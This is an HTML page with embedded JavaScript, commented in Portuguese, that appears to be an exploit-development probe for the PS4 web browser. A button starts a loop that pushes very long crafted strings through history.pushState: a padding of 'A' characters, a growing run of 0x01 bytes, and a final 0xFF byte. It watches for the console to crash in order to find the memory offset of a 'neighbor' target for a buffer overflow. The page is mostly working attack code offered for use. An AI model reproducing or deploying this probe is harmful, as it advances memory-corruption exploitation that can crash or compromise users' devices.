<!DOCTYPE html>
<html>
<head>
    <title>PS4 Void Mapper (Neighbor Hunter)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        
        #distance-display { 
            font-size: 60px; 
            color: #fff; 
            border: 4px solid #00ff00;
            padding: 20px;
            margin: 20px;
            background: #111;
        }

        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: none; background: #005500; color: #fff; font-weight: bold;
        }
        
        #log { text-align: left; margin-top: 20px; color: #aaa; }
    </style>
</head>
<body>

    <h1>Mapeador de Vizinhos</h1>
    <p>Avançando de 1KB em 1KB até bater em algo sólido.</p>

    <div id="distance-display">0 KB</div>

    <button onclick="startMapping()">INICIAR SONAR</button>
    
    <div id="log">Pronto.</div>

    <script>
        const BASE_OFFSET = 709522;
        
        // Começa testando logo após a fronteira
        // Vamos pular de 4KB em 4KB (tamanho de página de memória) para ser rápido
        const STEP = 4096; 
        const MAX_DIST = 1024 * 1024 * 4; // Tenta até 4MB de distância

        function log(msg) {
            document.getElementById('log').innerHTML = `<div>${msg}</div>` + document.getElementById('log').innerHTML;
        }

        function updateDisplay(val) {
            document.getElementById('distance-display').innerText = (val / 1024).toFixed(1) + " KB";
        }

        async function startMapping() {
            // Loop de distância
            for (let dist = 1024; dist < MAX_DIST; dist += STEP) {
                
                updateDisplay(dist);
                
                let survived = await pingLocation(dist);
                
                if (survived) {
                    log(`Distância +${dist}: VAZIO (Sobreviveu a 0xFF)`);
                } else {
                    // O console vai travar aqui, então este log talvez nem apareça
                    log(`Distância +${dist}: !!! COLISÃO !!!`);
                    alert("ALVO ENCONTRADO EM " + dist); 
                    break;
                }
                
                // Pequena pausa para não travar a UI
                await new Promise(r => setTimeout(r, 100));
            }
        }

        function pingLocation(distance) {
            return new Promise(resolve => {
                setTimeout(() => {
                    try {
                        // 1. Base Segura
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // 2. A Ponte Segura (0x01) até o ponto de teste
                        buffer += "\x01".repeat(distance);
                        
                        // 3. A Mina (0xFF)
                        // Se houver algo importante aqui, o 0xFF vai matar o sistema
                        buffer += "\xFF";

                        // Dispara
                        history.pushState({}, "map_" + distance, "/" + buffer);
                        
                        // Se chegou aqui, não tinha nada importante nessa distância
                        resolve(true);

                    } catch (e) {
                        // Erro de memória não conta como colisão
                        log("Erro OOM: " + e.message);
                        resolve(true); 
                    }
                }, 50);
            });
        }
    </script>
</body>
</html>
